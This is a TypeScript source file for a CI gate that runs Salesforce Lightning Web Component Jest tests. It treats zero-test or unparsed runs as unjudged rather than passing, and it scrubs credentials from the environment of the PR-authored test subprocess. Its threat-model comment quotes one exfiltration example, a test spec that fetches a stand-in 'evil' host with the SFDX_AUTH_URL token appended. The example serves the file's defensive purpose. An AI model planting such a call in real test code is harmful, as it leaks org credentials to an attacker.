// `salesforce-lwc-jest`: the Lightning Web Component unit tests, run LOCALLY. No org, no
// credential, no deploy -- sfdx-lwc-jest is a Jest preset that stubs the `lightning/*` and
// `@salesforce/*` module namespaces, so LWC specs execute on the runner in seconds while the
// org-backed gates (org.ts) are still logging in.
//
// THIS FILE IS WRITTEN AGAINST cve.ts's LESSON, the same one code-analyzer.ts is written
// against: a gate that runs a tool, gets a result it does not understand, and reports `pass`.
// A test runner has its own dialect of that defect, and it is the reason most of the code
// below exists:
//
//   1. JEST EXITS 0 WHEN IT MATCHED ZERO TEST FILES on any tenant whose config carries
//      `passWithNoTests` (the scaffolding Salesforce's own `force:lightning:lwc:test:setup`
//      writes, and every repo that ever added the flag to unblock a red build). "Ran no tests"
//      and "ran every test and they all passed" are then the SAME exit code, and the second
//      reading is a green check for a component suite that was never executed. So the exit
//      code is not the verdict on its own: jest's summary is parsed, and a run that executed
//      zero test files is `unjudged`, never `pass` -- exactly as code-analyzer.ts treats an
//      engine that did not run.
//   2. AN OUTPUT WITH NO JEST SUMMARY IS A DOCUMENT WE DO NOT RECOGNISE. `Test Suites: N
//      total` is printed on a clean run, a failing run and a no-tests run alike, so its
//      ABSENCE is the "this never completed" signal (the same role `auditSummary` plays for
//      Yarn 1 in cve.ts). Absence is `unjudged`, never "zero failures".
//   3. THE RUNNER IS THE TENANT'S OWN INSTALLED BINARY -- `node_modules/.bin/sfdx-lwc-jest` in
//      the checkout -- and it is never fetched. `npx sfdx-lwc-jest` would resolve a name over
//      the network at gate time and execute whatever bytes came back, inside a security gate,
//      with no version pin and no digest: precisely what provision.ts exists to refuse.
//
//      WHAT PRODUCES IT is action.yml's `Install LWC test dependencies` step, which runs
//      `npm ci --ignore-scripts` in the checkout when the gate stage is running against an sfdx
//      project that has a `package-lock.json`. That step is not optional garnish: a gate whose
//      runner nothing in the pipeline creates is unreachable, and its skip -- non-benign by
//      rule 6's logic -- would raise `gate_never_fired` on every Salesforce tenant forever.
//      A gate and its producer land together or neither lands.
//
//      `--ignore-scripts` is why the install is safe to do at all: npm lifecycle scripts are
//      arbitrary code, and here they are code the PR under gate authored. A missing binary
//      after that step is still a NON-BENIGN skip naming it, and never a pass.
//   4. The runner is invoked through `runCommand(bin, args, cwd)` with an argv ARRAY, never a
//      shell string, so no discovered path can be read as shell syntax.
//   5. THIS SUBPROCESS IS THE PR'S OWN CODE, so it gets neither the org credential nor the
//      action's inputs. sfdx-lwc-jest executes test files AUTHORED BY THE BRANCH UNDER GATE,
//      which makes this the one place in the Salesforce profile where an attacker chooses what
//      runs. Two independent controls, because they answer two different threats:
//
//        - EXFILTRATION (a spec that does `fetch(evil + process.env.SFDX_AUTH_URL)`): the
//          credential is not in the environment to begin with. runner.yml passes it as the
//          `salesforce-auth-url` INPUT, and a composite action's inputs are not exported to its
//          `run:` steps, so it reaches only action.yml's `Run gates` step; and the `exec` call
//          below passes an explicit `scrubbedSubprocessEnv(env)` (subprocess-env.ts), which
//          drops the whole `SF_*`/`SFDX_*` and `INPUT_*` namespaces rather than a list of known
//          names. An earlier cut of this file relied on redaction alone for this, which was the
//          wrong control: redaction cannot stop a network call.
//        - DISCLOSURE (jest echoing something sensitive into its own output, which becomes a
//          finding and then a PR comment): every byte of jest output that reaches a finding
//          goes through org.ts's `redactSecrets` first, as org-gate-common.ts rule 5 requires.
//
//      Neither substitutes for the other, and removing either re-opens its own threat.
//   6. "THERE ARE NO COMPONENTS" AND "WE STOPPED LOOKING FOR THEM" ARE DIFFERENT FACTS. The
//      directory probe is bounded (depth, directory budget) and cannot read every directory, so
//      both answers arrive as an empty list. Only the first is benign: `no-config` is classified
//      BENIGN by control-plane/gate-verdict-ledger.ts's SKIP_CLASSES and therefore never raises
//      `gate_never_fired`, so reporting a truncated probe that way would switch this gate off
//      permanently and silently on exactly the large monorepos where the probe runs out of
//      budget. A probe that did not complete is a NON-BENIGN skip that names what cut it short.

import { readdirSync, type Dirent } from 'node:fs';
import path from 'node:path';

import { runCommand } from '../exec.ts';
import { boundedCapture } from '../output-capture.ts';
import type { StackProfile } from '../stack-profile.ts';
import type { Gate, GateContext, GateResult } from '../types.ts';
import { redactSecrets } from './org.ts';
import { analysisRoots, notSalesforceSkip, salesforceApplicability, skip, toolAbsentSkip, unjudged } from './profile.ts';
import { isExecutableFile } from './provision.ts';
import { scrubbedSubprocessEnv } from './subprocess-env.ts';

export const LWC_JEST_GATE_ID = 'salesforce-lwc-jest';

// The tenant's installed runner, relative to the checkout root. `.bin` is what a package
// manager writes for `@salesforce/sfdx-lwc-jest`'s `bin` entry, so this is the same executable
// the tenant's own `npm run test:unit` invokes -- not a second, differently-versioned copy.
export const LWC_JEST_BIN = path.join('node_modules', '.bin', 'sfdx-lwc-jest');

// LWC specs are pure jsdom units with no network and no org round-trip; a suite that has not
// finished in five minutes has hung rather than slowed down. Well below the runner job's own
// budget so the gate reports the timeout instead of being killed before it writes a report.
const JEST_TIMEOUT_MS = 5 * 60 * 1000;

// How deep beneath an analysis root the `lwc` folder is looked for. The sfdx layout puts it at
// `<packageDir>/main/default/lwc` -- three levels under a packageDirectory, and four when the
// project declares none that survive the checkout and analysisRoots falls back to the repo
// root. BOUNDED on purpose: an unbounded walk of a customer checkout would descend into build
// output and vendored trees, and cost more than the tests it is looking for.
//
// SIX, NOT FOUR, and the extra two are about ALARM POSTURE rather than about finding LWC. A
// probe that is cut short reports the non-benign `unjudgeable-language` (it cannot honestly say
// "there is no LWC here" when it stopped looking), and that skip raises `gate_never_fired`. At
// depth 4 an ordinary Apex-only sfdx repo trips it on every PR without fail: standard metadata
// nests to `force-app/main/default/objects/<Object>/fields/<Field>.field-meta.xml`, which is
// depth 5. Every LWC-less Salesforce tenant would then get a permanent operator alarm about a
// gate that is working correctly. Six clears the standard layout, so the honest cut-short stays
// rare and keeps meaning something when it does fire.
const MAX_LWC_PROBE_DEPTH = 6;

// A second bound, for the pathological monorepo: probing is a means to an end, and a gate that
// spends thirty seconds in readdir before it starts is a gate people turn off.
const MAX_LWC_PROBE_DIRS = 500;

// Directories never worth descending into. `node_modules` is the expensive one -- every
// installed LWC dependency ships its own `lwc` directory, and matching one of those would aim
// the test run at the tenant's dependencies instead of their components.
const SKIPPED_DIRS = new Set(['node_modules', '.git', 'dist', 'build', 'coverage']);

// ---------------------------------------------------------------------------
// Locating the components
// ---------------------------------------------------------------------------

// How many cut-short directories are named before the rest are counted. The reason exists to be
// diagnosed, and the fortieth unreadable path helps nobody.
const MAX_NAMED_CUTS = 5;

export interface LwcProbeResult {
  // Every `lwc` directory beneath the project's packageDirectories, as workspace-relative POSIX
  // paths.
  dirs: string[];
  // Undefined ONLY when every directory reachable under the roots was actually read; otherwise a
  // description of what stopped the walk -- the depth bound, the directory budget, or a
  // directory this process could not read. `dirs.length === 0` means "this repo has no
  // Lightning Web Components" only while this is undefined. With it set the empty list means we
  // ran out of search, not out of components, and the two must not share a verdict (rule 6).
  cutShort?: string;
}

// The bounded walk. Both bounds and every failed readdir are RECORDED rather than absorbed,
// because the caller's verdict turns entirely on why the list came back empty.
export function probeLwcDirectories(
  workspaceRoot: string,
  roots: readonly string[],
  maxDepth: number = MAX_LWC_PROBE_DEPTH,
): LwcProbeResult {
  const found: string[] = [];
  let visited = 0;
  let depthLimited = 0;
  let budgetExhausted = false;
  const unreadable: string[] = [];

  const walk = (relative: string, depth: number): void => {
    if (depth > maxDepth) {
      // A subtree we declined to enter. It could hold an `lwc` directory; we did not look.
      depthLimited += 1;
      return;
    }
    if (visited >= MAX_LWC_PROBE_DIRS) {
      budgetExhausted = true;
      return;
    }
    visited += 1;
    let entries: Dirent[];
    try {
      entries = readdirSync(path.join(workspaceRoot, relative), { withFileTypes: true });
    } catch {
      // An unreadable directory is not an absent one. A checkout whose component tree is
      // unreadable (EACCES, a broken symlink, fd exhaustion) must not read as a checkout with no
      // components, so the failure is carried out to the caller instead of swallowed.
      unreadable.push(relative === '' ? '.' : relative);
      return;
    }
    for (const entry of entries) {
      if (!entry.isDirectory() || SKIPPED_DIRS.has(entry.name) || entry.name.startsWith('.')) continue;
      const child = relative === '' ? entry.name : `${relative}/${entry.name}`;
      if (entry.name === 'lwc') {
        found.push(child);
        // Not descended into: components nest under their `lwc` root, and a second match
        // inside one would be the same test surface counted twice.
        continue;
      }
      walk(child, depth + 1);
    }
  };

  for (const root of roots) {
    walk(root === '.' ? '' : root.replace(/\/$/, ''), 1);
  }

  const cuts: string[] = [];
  if (budgetExhausted) cuts.push(`the ${MAX_LWC_PROBE_DIRS}-directory probe budget was exhausted`);
  if (depthLimited > 0) {
    cuts.push(`${depthLimited} subtree(s) below the depth-${maxDepth} bound were not entered`);
  }
  if (unreadable.length > 0) {
    const named = unreadable.slice(0, MAX_NAMED_CUTS).join(', ');
    const rest = unreadable.length > MAX_NAMED_CUTS ? ` and ${unreadable.length - MAX_NAMED_CUTS} more` : '';
    cuts.push(`${unreadable.length} directory/directories could not be read (${named}${rest})`);
  }

  const dirs = [...new Set(found)].sort();
  return cuts.length > 0 ? { dirs, cutShort: cuts.join('; ') } : { dirs };
}

export function changedUnderLwc(changedFiles: readonly string[], lwcDirs: readonly string[]): string[] {
  return changedFiles.filter((file) => lwcDirs.some((dir) => file === dir || file.startsWith(`${dir}/`)));
}

// ---------------------------------------------------------------------------
// Resolving the runner
// ---------------------------------------------------------------------------

export type LwcJestResolution = { kind: 'ready'; bin: string } | { kind: 'absent'; reason: string };

// The tenant's OWN installed runner or nothing. Deliberately no `npx` fallback and no
// provisioning: see rule 3 in the header.
export function resolveLwcJestRunner(workspaceRoot: string): LwcJestResolution {
  const bin = path.join(workspaceRoot, LWC_JEST_BIN);
  if (!isExecutableFile(bin)) {
    return {
      kind: 'absent',
      reason:
        `${LWC_JEST_BIN} is not present in the checkout, so the Lightning Web Component tests were ` +
        `not run. This gate runs the tenant's OWN installed runner and never fetches one -- an ` +
        `\`npx sfdx-lwc-jest\` would resolve and execute unpinned, unverified bytes from the network ` +
        `inside a gate. The runner is produced by the action's \`Install LWC test dependencies\` ` +
        `step, which runs \`npm ci --ignore-scripts\` when this repo has a package-lock.json; check ` +
        `that step's log. The commonest causes are: no package-lock.json at the repo root (only ` +
        `npm is installed here -- a Yarn or pnpm LWC project is not), a lockfile that disagrees ` +
        `with package.json (npm ci refuses a tree it cannot resolve exactly), or ` +
        `@salesforce/sfdx-lwc-jest missing from devDependencies.`,
    };
  }
  return { kind: 'ready', bin };
}

// ---------------------------------------------------------------------------
// Reading what jest said
// ---------------------------------------------------------------------------

export type JestOutcome =
  | { kind: 'ran'; suites: number; tests: number }
  // Jest completed having matched no test file. NEVER a pass: nothing was executed, so nothing
  // was verified, whatever the exit code said.
  | { kind: 'no-tests'; detail: string }
  // No jest summary in the output at all. NEVER "no failures".
  | { kind: 'unrecognised'; reason: string };

// Jest colours its summary when it thinks it has a TTY. execFile gives it none, but a tenant
// config with `color: true` or a wrapper that allocates a pty would, and a regex that only
// matches uncoloured output would then read every run as unrecognised.
// Built from a char code rather than written as an escape so the source carries no control
// character in a regex literal (and needs no lint suppression for one).
const ANSI = new RegExp(`${String.fromCharCode(27)}\\[[0-9;]*m`, 'g');
const NO_TESTS = /No tests found/;
const SUITE_TOTAL = /^Test Suites:.*?(\d+) total\s*$/m;
const TEST_TOTAL = /^Tests:.*?(\d+) total\s*$/m;

// Jest writes its summary to STDERR and its reporter noise to both, so both are read. Strict
// about the SUMMARY and forgiving about everything else: a missing `Tests:` line costs a
// number in one finding, while a missing `Test Suites:` line means we are not looking at a
// jest run and no verdict may be drawn from it.
export function parseJestOutcome(stdout: string, stderr: string): JestOutcome {
  const output = `${stdout}\n${stderr}`.replace(ANSI, '');

  // Checked FIRST, and independently of the exit code: jest prints this line whether it then
  // exits 1 (its default) or 0 (`--passWithNoTests`), and the 0 is the false green this gate
  // exists to refuse.
  if (NO_TESTS.test(output)) {
    return {
      kind: 'no-tests',
      detail: 'jest reported "No tests found"',
    };
  }

  const suiteMatch = SUITE_TOTAL.exec(output);
  if (suiteMatch === null) {
    return {
      kind: 'unrecognised',
      reason:
        'the output carries no `Test Suites: N total` summary. Jest prints that line on a clean ' +
        'run, a failing run and a no-tests run alike, so its absence means this is not a completed ' +
        'jest run -- an absent summary is not zero failures. A custom `reporters` entry in the ' +
        "tenant's jest config is the likeliest cause.",
    };
  }

  const suites = Number(suiteMatch[1]);
  const testMatch = TEST_TOTAL.exec(output);
  const tests = testMatch === null ? 0 : Number(testMatch[1]);
  if (suites === 0 || tests === 0) {
    return {
      kind: 'no-tests',
      detail: `jest reported ${suites} test suite(s) and ${tests} test(s)`,
    };
  }
  return { kind: 'ran', suites, tests };
}

// ---------------------------------------------------------------------------
// The gate
// ---------------------------------------------------------------------------

export interface LwcJestDeps {
  exec?: typeof runCommand;
  resolve?: (workspaceRoot: string) => LwcJestResolution;
  // Injected only so a test can prove the credential is scrubbed out of the subprocess
  // environment without putting a real secret in the ambient one.
  env?: NodeJS.ProcessEnv;
}

// What there is to test, or the skip that says why nothing was. The three preflight refusals
// are gathered here -- each one a reason NOT to assert anything -- so `run` below is the jest
// invocation and its reading, and no refusal can be lost in the middle of a long function.
type TestSurface =
  | { kind: 'skip'; result: GateResult }
  | { kind: 'ready'; lwcDirs: string[]; touched: string[]; bin: string };

function resolveTestSurface(
  id: string,
  ctx: GateContext,
  profile: StackProfile,
  resolve: (workspaceRoot: string) => LwcJestResolution,
): TestSurface {
  // `ctx.workspaceRoot` is NOT optional here, and this gate is the reason the parameter
  // exists at all: it is the only Salesforce gate that WALKS THE FILESYSTEM from these
  // roots. The roots come out of the PR's own sfdx-project.json, so without containment a
  // `packageDirectories: [{"path": "../.."}]` -- which survives the detector's existence
  // check -- would point probeLwcDirectories at directories above the checkout.
  const roots = analysisRoots(profile, ctx.workspaceRoot);

  // 1. Are there components at all? A Salesforce org that is all Apex and Flows has no LWC
  // to test, and that is the one genuinely benign "nothing to do" here -- `no-config`, the
  // same reason a repo with no sfdx-project.json takes. It is claimable ONLY for a probe
  // that ran to completion (rule 6).
  const probe = probeLwcDirectories(ctx.workspaceRoot, roots);
  const lwcDirs = probe.dirs;
  if (lwcDirs.length === 0 && probe.cutShort !== undefined) {
    return {
      kind: 'skip',
      result: skip(id, 'unjudgeable-language', [
        `${id} asserted NOTHING: the search for \`lwc\` directories under [${roots.join(', ')}] ` +
          `was CUT SHORT (${probe.cutShort}), so "found no components" here means "the search ` +
          `stopped", not "there are none". Reported with a NON-BENIGN reason rather than as ` +
          `\`no-config\`, because a benign skip is excused by the ledger and would leave this gate ` +
          `permanently silent -- and unalarmed -- on the large repos where the probe runs out of ` +
          `budget.`,
      ]),
    };
  }
  if (lwcDirs.length === 0) {
    return {
      kind: 'skip',
      result: skip(id, 'no-config', [
        `${id} did not run: the search of [${roots.join(', ')}] ran to completion and found no ` +
          `\`lwc\` directory, so this Salesforce repo has no Lightning Web Components to test. ` +
          `Nothing was asserted, and nothing was claimed.`,
      ]),
    };
  }

  // 2. Does this diff touch them? Diff-scoped and NON-benign (`no-matching-files` -- a FILE
  // matcher that selected nothing, which #402 split out from the route matcher), so it
  // stays out of the coverage record: the very next PR that edits a component runs the
  // full suite with nothing configured away.
  const touched = changedUnderLwc(ctx.changedFiles, lwcDirs);
  if (touched.length === 0) {
    return {
      kind: 'skip',
      result: skip(id, 'no-matching-files', [
        `${id} examined 0 of ${ctx.changedFiles.length} changed file(s): this diff changes ` +
          `nothing under [${lwcDirs.join(', ')}]. Nothing was asserted about the Lightning Web ` +
          `Components on this PR.`,
      ]),
    };
  }

  // 3. Is the runner there? Absence is a skip with a reason, never a pass (rule 3).
  const runner = resolve(ctx.workspaceRoot);
  if (runner.kind === 'absent') return { kind: 'skip', result: toolAbsentSkip(id, runner.reason) };

  return { kind: 'ready', lwcDirs, touched, bin: runner.bin };
}

export function createLwcJestGate(deps: LwcJestDeps = {}): Gate {
  const id = LWC_JEST_GATE_ID;
  return {
    id,
    async run(ctx: GateContext): Promise<GateResult> {
      const applicability = salesforceApplicability(ctx);
      if (applicability.kind === 'not-salesforce') return notSalesforceSkip(id, applicability);

      const exec = deps.exec ?? runCommand;
      const env = deps.env ?? process.env;

      const surface = resolveTestSurface(id, ctx, applicability.profile, deps.resolve ?? resolveLwcJestRunner);
      if (surface.kind === 'skip') return surface.result;
      const { lwcDirs, touched } = surface;

      // `--` hands the rest to jest, which is sfdx-lwc-jest's documented passthrough. `--ci` is
      // the one flag worth spending: without it jest WRITES a missing snapshot and passes,
      // so a component whose rendered output changed would be greened by the gate recording
      // the new output as the expectation. With it, an unwritten snapshot fails.
      const args = ['--', '--ci'];

      try {
        const { exitCode, stdout, stderr } = await exec(surface.bin, args, ctx.workspaceRoot, {
          // EXPLICIT, SCRUBBED env -- not the inherited one. THIS SUBPROCESS RUNS THE PR'S OWN
          // TEST FILES. runCommand passes `env` to execFile only when a caller provides it, so
          // omitting this would hand a branch-authored Jest suite the whole of process.env,
          // including the durable org refresh token in SFDX_AUTH_URL, which one `fetch` would
          // send offsite while the gate reported `pass`. redactSecrets on the findings does not
          // touch that -- it stops disclosure into a comment, not exfiltration over the
          // network. See subprocess-env.ts.
          env: scrubbedSubprocessEnv(env),
          timeoutMs: JEST_TIMEOUT_MS,
        });
        // Redacted ONCE, here, so no branch below can reach a finding holding a raw byte of what
        // the PR's own test code printed (rule 5). Parsing reads the redacted text as well: the
        // patterns only ever shorten a credential-shaped run of characters, and jest's summary
        // lines carry nothing they match.
        const output = redactSecrets(`${stdout}\n${stderr}`);
        const outcome = parseJestOutcome(output, '');

        // Read BEFORE the exit code is consulted, because the whole defect is that exit 0 and
        // "no tests were executed" can be the same run.
        if (outcome.kind === 'no-tests') {
          return unjudged(id, 'content', [
            `${id} ran ${LWC_JEST_BIN} over [${lwcDirs.join(', ')}] and executed NO tests ` +
              `(${outcome.detail}, exit ${exitCode}). ${touched.length} changed file(s) under those ` +
              `directories were therefore verified by nothing. A test run that matched zero test ` +
              `files is reported as unjudged, never as a pass -- exit 0 here means "jest had ` +
              `nothing to do", not "the components work".`,
            // The counts alone say a suite did not run; they never say WHY. On a non-zero exit
            // the reason is in jest's own output and nowhere else -- "Cannot find module
            // 'c/foo'" from a suite that failed to load, which is exactly what a tenant whose
            // LWC setup needs a postinstall sees once `--ignore-scripts` skips it (action.yml's
            // install step). That case is the escape hatch this gate's design argument rests
            // on, and action.yml promises "a fail from the gate WITH jest's own output"; a
            // finding carrying only "1 suite, 0 tests" makes the promise false and the failure
            // unreadable. Appended only when the exit code is non-zero: a clean `passWithNoTests`
            // run has nothing to explain, and its output is noise in a PR comment.
            ...(exitCode !== 0 ? [boundedCapture(output)] : []),
          ]);
        }
        if (outcome.kind === 'unrecognised') {
          return unjudged(id, exitCode === 0 ? 'content' : 'infra', [
            `${id} could not read the result of ${LWC_JEST_BIN} (exit ${exitCode}): ${outcome.reason}`,
            boundedCapture(output),
          ]);
        }

        if (exitCode !== 0) {
          return {
            id,
            status: 'fail',
            findings: [
              `${id}: ${LWC_JEST_BIN} exited ${exitCode} over ${outcome.suites} test suite(s) / ` +
                `${outcome.tests} test(s) in [${lwcDirs.join(', ')}].`,
              // Head AND tail (output-capture.ts): jest prints each failed assertion's diff in
              // order and its tallies last, so a tail-only capture would hand the autofixer the
              // count of what broke without the assertion that explains it.
              boundedCapture(output),
            ],
          };
        }

        // A pass says what it executed, so "24 tests over force-app/main/default/lwc" can never
        // be mistaken for a runner that found nothing to do.
        return {
          id,
          status: 'pass',
          findings: [
            `${id} ran ${outcome.tests} test(s) across ${outcome.suites} suite(s) in ` +
              `[${lwcDirs.join(', ')}] via ${LWC_JEST_BIN} (the tenant's installed runner): all passed.`,
          ],
        };
      } catch (err) {
        // runCommand rejects only on a spawn failure, a timeout or an output-budget overrun --
        // all of which MIGHT clear on a re-run, hence `infra` and its bounded gate-only retry.
        // Redacted like every other subprocess-derived string: an output-budget overrun quotes
        // the output that overran it, which is jest's, which is the PR's (rule 5).
        return unjudged(id, 'infra', [
          `${id} could not run ${LWC_JEST_BIN}: ${redactSecrets(err instanceof Error ? err.message : String(err))}. ` +
            `The Lightning Web Component tests did not execute.`,
        ]);
      }
    },
  };
}
